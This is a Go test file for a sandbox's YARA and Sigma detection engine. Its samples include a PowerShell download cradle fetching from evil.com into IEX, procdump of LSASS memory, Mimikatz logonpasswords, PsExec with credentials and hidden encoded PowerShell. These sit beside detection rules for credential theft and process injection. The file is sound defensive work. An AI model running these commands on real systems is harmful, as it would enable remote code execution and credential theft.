package rules_test

// external_rules_test.go — verifies external .yar and .yml rule loading,
// covering all three new capabilities:
//   1. YARA regex strings  ($s = /pattern/i)
//   2. YARA hex wildcards  ({ 4D ?? 5A })
//   3. YARA boolean conditions ($s1 and $s2 / or / not)
//   4. Sigma NOT filter    (condition: selection and not filter)
//   5. Sigma 1 of selection_* wildcard selector expansion
//   6. Sigma |re modifier  (regex field matching)

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/lemas-sandbox/lemas/pkg/monitor"
	"github.com/lemas-sandbox/lemas/pkg/rules"
)

const rulesDir = "../../rules/yara"
const sigmaRulesDir = "../../rules/sigma"

// writeRule creates a temp .yar or .yml file in a temp dir, returns the dir path.
func writeTempRule(t *testing.T, filename, content string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, filename), []byte(content), 0644); err != nil {
		t.Fatalf("writeTempRule: %v", err)
	}
	return dir
}

// ─── YARA: existing rules from rules/ dir ────────────────────────────────────

func TestExternalYaraRuleAgentTesla(t *testing.T) {
	scanner, err := rules.NewYaraScanner(rulesDir)
	if err != nil {
		t.Fatalf("NewYaraScanner: %v", err)
	}
	content := []byte("smtp.gmail.com GetAsyncKeyState stolen credentials")
	hits := scanner.ScanMemory(1234, "0x00400000", content)
	found := false
	for _, h := range hits {
		if h.RuleName == "DetectAgentTesla" {
			found = true
			if h.MITRETTP != "T1056.001" {
				t.Errorf("expected T1056.001, got %s", h.MITRETTP)
			}
		}
	}
	if !found {
		t.Error("expected DetectAgentTesla hit from external .yar rule")
	}
}

func TestExternalYaraRuleRemcosRAT(t *testing.T) {
	scanner, _ := rules.NewYaraScanner(rulesDir)
	content := []byte("REMCOS_PERS registry key for persistence")
	hits := scanner.ScanScript(content, "test:remcos")
	found := false
	for _, h := range hits {
		if h.RuleName == "DetectRemcosRAT" {
			found = true
		}
	}
	if !found {
		t.Error("expected DetectRemcosRAT hit from external .yar rule")
	}
}

func TestExternalYaraRuleBase64PS(t *testing.T) {
	scanner, _ := rules.NewYaraScanner(rulesDir)
	content := []byte(`powershell -EncodedCommand SQBFAFgA`)
	hits := scanner.ScanScript(content, "test:b64ps")
	found := false
	for _, h := range hits {
		if h.RuleName == "SuspiciousBase64PowerShellDrop" {
			found = true
		}
	}
	if !found {
		t.Error("expected SuspiciousBase64PowerShellDrop from external .yar rule")
	}
}

// ─── NEW: YARA regex strings ──────────────────────────────────────────────────

func TestYaraRegexCaseInsensitive(t *testing.T) {
	dir := writeTempRule(t, "regex_test.yar", `
rule RegexMimikatz {
    meta:
        description = "Mimikatz via regex"
        severity    = "critical"
        mitre       = "T1003.001"
    strings:
        $re1 = /mimi[kK]atz/i
        $re2 = /sekurlsa::/
    condition:
        any of them
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	// Case variation — should match /mimi[kK]atz/i
	hits := scanner.ScanMemory(1, "0x0", []byte("found MiMiKaTz in heap"))
	found := false
	for _, h := range hits {
		if h.RuleName == "RegexMimikatz" {
			found = true
		}
	}
	if !found {
		t.Error("YARA regex: expected RegexMimikatz hit for case-insensitive /mimi[kK]atz/i")
	}
}

func TestYaraRegexSecondPattern(t *testing.T) {
	dir := writeTempRule(t, "regex_test.yar", `
rule RegexMimikatz {
    meta:
        description = "Mimikatz via regex"
        severity    = "critical"
        mitre       = "T1003.001"
    strings:
        $re1 = /mimi[kK]atz/i
        $re2 = /sekurlsa::/
    condition:
        any of them
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	hits := scanner.ScanMemory(2, "0x0", []byte("privilege::debug sekurlsa::logonpasswords"))
	found := false
	for _, h := range hits {
		if h.RuleName == "RegexMimikatz" {
			found = true
		}
	}
	if !found {
		t.Error("YARA regex: expected RegexMimikatz hit for /sekurlsa::/")
	}
}

// ─── NEW: YARA hex wildcards ──────────────────────────────────────────────────

func TestYaraHexWildcardMatch(t *testing.T) {
	dir := writeTempRule(t, "hex_test.yar", `
rule MZWildcard {
    meta:
        description = "PE MZ header with wildcard second byte"
        severity    = "high"
        mitre       = "T1055.002"
    strings:
        $mz = { 4D 5A ?? ?? 00 00 }
    condition:
        any of them
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	// Bytes: 4D 5A 90 00 00 00 — ?? matches 90 00
	data := []byte{0x4D, 0x5A, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00}
	hits := scanner.ScanMemory(3, "0x0", data)
	found := false
	for _, h := range hits {
		if h.RuleName == "MZWildcard" {
			found = true
		}
	}
	if !found {
		t.Error("YARA hex wildcard: expected MZWildcard hit for { 4D 5A ?? ?? 00 00 }")
	}
}

func TestYaraHexWildcardNoFalsePositive(t *testing.T) {
	dir := writeTempRule(t, "hex_test.yar", `
rule MZWildcard {
    meta:
        description = "PE MZ header"
        severity    = "high"
        mitre       = "T1055.002"
    strings:
        $mz = { 4D 5A ?? ?? 00 00 }
    condition:
        any of them
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	// No MZ header present
	data := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05}
	hits := scanner.ScanMemory(4, "0x0", data)
	for _, h := range hits {
		if h.RuleName == "MZWildcard" {
			t.Error("YARA hex wildcard: unexpected MZWildcard hit on non-PE data")
		}
	}
}

// ─── NEW: YARA boolean conditions ────────────────────────────────────────────

func TestYaraBooleanAnd(t *testing.T) {
	dir := writeTempRule(t, "bool_test.yar", `
rule BothRequired {
    meta:
        description = "Both strings required"
        severity    = "high"
        mitre       = "T1059"
    strings:
        $s1 = "VirtualAlloc"
        $s2 = "WriteProcessMemory"
    condition:
        $s1 and $s2
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	// Both present — should fire
	hits := scanner.ScanMemory(5, "0x0", []byte("calls VirtualAlloc and WriteProcessMemory"))
	found := false
	for _, h := range hits {
		if h.RuleName == "BothRequired" {
			found = true
		}
	}
	if !found {
		t.Error("YARA boolean AND: expected BothRequired hit when both strings present")
	}

	// Only one present — should NOT fire
	hits2 := scanner.ScanMemory(6, "0x0", []byte("calls VirtualAlloc only"))
	for _, h := range hits2 {
		if h.RuleName == "BothRequired" {
			t.Error("YARA boolean AND: unexpected hit when only one string present")
		}
	}
}

func TestYaraNOfThem(t *testing.T) {
	dir := writeTempRule(t, "nof_test.yar", `
rule TwoOfThree {
    meta:
        description = "At least 2 of 3 injection APIs"
        severity    = "high"
        mitre       = "T1055"
    strings:
        $s1 = "VirtualAllocEx"
        $s2 = "WriteProcessMemory"
        $s3 = "CreateRemoteThread"
    condition:
        2 of them
}`)
	scanner, _ := rules.NewYaraScanner(dir)

	// 2 present
	hits := scanner.ScanMemory(7, "0x0", []byte("VirtualAllocEx WriteProcessMemory"))
	found := false
	for _, h := range hits {
		if h.RuleName == "TwoOfThree" {
			found = true
		}
	}
	if !found {
		t.Error("YARA N of them: expected TwoOfThree with 2 of 3 strings")
	}

	// Only 1 — should not fire
	hits2 := scanner.ScanMemory(8, "0x0", []byte("VirtualAllocEx only"))
	for _, h := range hits2 {
		if h.RuleName == "TwoOfThree" {
			t.Error("YARA N of them: unexpected hit with only 1 of 3")
		}
	}
}

// ─── Sigma: existing rules from rules/ dir ────────────────────────────────────

func TestExternalSigmaDownloadCradle(t *testing.T) {
	corr, err := rules.NewSigmaCorrelatorWithDir(sigmaRulesDir)
	if err != nil {
		t.Fatalf("NewSigmaCorrelatorWithDir: %v", err)
	}
	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventPowerShell,
		PID:       1111,
		Category:  monitor.CatScript,
		Data: map[string]interface{}{
			"script_block": `(New-Object Net.WebClient).DownloadString("http://evil.com/p.ps1") | IEX`,
		},
	}
	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "PowerShell Suspicious Download Cradle" {
			found = true
			if h.MITRETTP != "T1105" {
				t.Errorf("expected T1105, got %s", h.MITRETTP)
			}
		}
	}
	if !found {
		t.Error("expected 'PowerShell Suspicious Download Cradle' from external .yml Sigma rule")
	}
}

func TestExternalSigmaLSASSRead(t *testing.T) {
	corr, _ := rules.NewSigmaCorrelatorWithDir(sigmaRulesDir)
	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID:       2222,
		Category:  monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    "procdump.exe -ma lsass.exe lsass.dmp",
			"image_path": `C:\Tools\procdump.exe`,
		},
	}
	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "LSASS Memory Read via ProcDump or Task Manager" {
			found = true
		}
	}
	if !found {
		t.Error("expected 'LSASS Memory Read via ProcDump or Task Manager' from external .yml")
	}
}

func TestExternalSigmaPsExec(t *testing.T) {
	corr, _ := rules.NewSigmaCorrelatorWithDir(sigmaRulesDir)
	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID:       3333,
		Category:  monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    `psexec \\192.168.1.5 -u admin -p pass cmd.exe`,
			"image_path": `C:\Tools\PsExec.exe`,
		},
	}
	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "PsExec Remote Execution" {
			found = true
		}
	}
	if !found {
		t.Error("expected 'PsExec Remote Execution' from external .yml")
	}
}

// ─── NEW: Sigma NOT filter ────────────────────────────────────────────────────

func TestSigmaNotFilter(t *testing.T) {
	dir := writeTempRule(t, "not_filter.yml", `title: Suspicious PowerShell Not Signed
description: PowerShell with suspicious flags but not from a trusted path
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-nop'
            - '-noprofile'
    filter:
        Image|contains:
            - 'C:\Windows\System32'
            - 'C:\Windows\SysWOW64'
    condition: selection and not filter
`)
	corr, _ := rules.NewSigmaCorrelatorWithDir(dir)

	// Suspicious cmdline from outside System32 — should fire
	evSuspicious := monitor.Event{
		JobID: "not-test", Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID: 100, Category: monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    "powershell -nop -w hidden -enc SQBFAFgA",
			"image_path": `C:\Users\victim\AppData\Roaming\powershell.exe`,
		},
	}
	hits := corr.Evaluate(evSuspicious)
	found := false
	for _, h := range hits {
		if h.RuleName == "Suspicious PowerShell Not Signed" {
			found = true
		}
	}
	if !found {
		t.Error("Sigma NOT filter: expected hit for suspicious PS outside System32")
	}

	// Same cmdline but from trusted System32 path — should NOT fire
	evTrusted := monitor.Event{
		JobID: "not-test", Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID: 101, Category: monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    "powershell.exe -nop -w hidden",
			"image_path": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		},
	}
	hits2 := corr.Evaluate(evTrusted)
	for _, h := range hits2 {
		if h.RuleName == "Suspicious PowerShell Not Signed" {
			t.Error("Sigma NOT filter: should not fire when image is from System32 (filter matched)")
		}
	}
}

// ─── NEW: Sigma 1 of selection_* wildcard ────────────────────────────────────

func TestSigmaOneOfWildcardSelectors(t *testing.T) {
	dir := writeTempRule(t, "wildcard_sel.yml", `
title: Process Injection APIs Observed
description: Any one of the classic injection API sets
level: critical
tags:
    - attack.defense_evasion
    - attack.t1055
logsource:
    category: process_creation
    product: windows
detection:
    selection_alloc:
        CommandLine|contains:
            - 'VirtualAllocEx'
    selection_write:
        CommandLine|contains:
            - 'WriteProcessMemory'
    selection_thread:
        CommandLine|contains:
            - 'CreateRemoteThread'
    condition: 1 of selection_*
`)
	corr, _ := rules.NewSigmaCorrelatorWithDir(dir)

	for _, cmdline := range []string{
		"invoke VirtualAllocEx in target",
		"call WriteProcessMemory now",
		"CreateRemoteThread into explorer",
	} {
		ev := monitor.Event{
			JobID: "wild-test", Timestamp: time.Now(),
			EventType: monitor.EventProcessCreate,
			PID: 200, Category: monitor.CatProcess,
			Data: map[string]interface{}{"cmdline": cmdline},
		}
		hits := corr.Evaluate(ev)
		found := false
		for _, h := range hits {
			if h.RuleName == "Process Injection APIs Observed" {
				found = true
			}
		}
		if !found {
			t.Errorf("Sigma 1 of selection_*: expected hit for cmdline %q", cmdline)
		}
	}
}

// ─── NEW: Sigma |re regex modifier ────────────────────────────────────────────

func TestSigmaReModifier(t *testing.T) {
	dir := writeTempRule(t, "re_modifier.yml", `
title: Encoded Command Regex Detection
description: Detects -e or -en or -enc as encoded command shorthand
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|re: '-e(nc?|ncodedCommand)\s'
    condition: selection
`)
	corr, _ := rules.NewSigmaCorrelatorWithDir(dir)

	for _, cmdline := range []string{
		"powershell -enc SQBFAFgA",
		"powershell -en SQBFAFgA",
		"powershell -encodedCommand SQBFAFgA",
	} {
		ev := monitor.Event{
			JobID: "re-test", Timestamp: time.Now(),
			EventType: monitor.EventProcessCreate,
			PID: 300, Category: monitor.CatProcess,
			Data: map[string]interface{}{"cmdline": cmdline},
		}
		hits := corr.Evaluate(ev)
		found := false
		for _, h := range hits {
			if h.RuleName == "Encoded Command Regex Detection" {
				found = true
			}
		}
		if !found {
			t.Errorf("Sigma |re: expected hit for cmdline %q", cmdline)
		}
	}
}
